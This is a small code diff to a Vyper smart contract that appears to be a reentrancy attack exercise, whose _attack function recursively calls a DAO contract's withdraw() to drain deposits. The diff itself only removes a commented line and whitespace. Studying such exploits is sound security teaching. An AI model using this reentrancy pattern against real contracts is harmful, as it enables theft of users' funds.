@@ -13,7 +13,6 @@ deposited: public(uint256)
 def __init__():
     self.dao_address = ZERO_ADDRESS
     self.owner_address = ZERO_ADDRESS
-    #self.counter = 10
 
 @internal
 def _attack() -> bool:
@@ -23,9 +22,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if(self.deposited > 0):
         self.deposited -= self.counter
-        DAO(self.dao_address).withdraw()
-        
-        
+        DAO(self.dao_address).withdraw()          
     return True
 
 @external
